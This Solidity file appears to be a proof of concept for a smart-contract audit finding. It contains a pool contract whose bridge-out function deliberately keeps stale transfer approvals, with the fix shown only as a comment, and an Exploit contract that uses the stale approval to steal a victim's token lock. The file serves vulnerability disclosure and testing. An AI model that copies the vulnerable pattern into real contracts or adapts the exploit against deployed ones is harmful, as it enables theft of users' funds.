// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
contract SDLPoolPrimary {
 mapping(uint=>address) public ownerOf; mapping(uint=>address) public tokenApprovals; mapping(uint=>uint) public locks;
 function mint(address o,uint id) external {ownerOf[id]=o;locks[id]=1000;}
 function approve(address a,uint id) external {require(msg.sender==ownerOf[id]);tokenApprovals[id]=a;}
 function handleOutgoingRESDL(address sender,uint id,address) external {require(ownerOf[id]==sender); delete locks[id]; delete ownerOf[id]; /* FIX: delete tokenApprovals[id]; */ } // @> VULN: bridge departure deletes owner but preserves stale transfer approval.
 function handleIncomingRESDL(address receiver,uint id) external {ownerOf[id]=receiver;locks[id]=1000;}
 function transferFrom(address from,address to,uint id) external {require(msg.sender==from||msg.sender==tokenApprovals[id]);require(ownerOf[id]==from);ownerOf[id]=to;tokenApprovals[id]=address(0);}
}
contract Alt {function steal(SDLPoolPrimary p,address victim,address thief,uint id) external {p.transferFrom(victim,thief,id);}}
contract Exploit {SDLPoolPrimary public pool; Alt public alt; address public constant VICTIM=address(0xBEEF); constructor(){pool=new SDLPoolPrimary();alt=new Alt();} function run() external {pool.mint(address(this),2);pool.approve(address(alt),2);pool.handleOutgoingRESDL(address(this),2,VICTIM);pool.handleIncomingRESDL(VICTIM,2);require(pool.tokenApprovals(2)==address(alt),"approval cleared");alt.steal(pool,VICTIM,address(this),2);require(pool.ownerOf(2)==address(this),"lock not stolen");}}
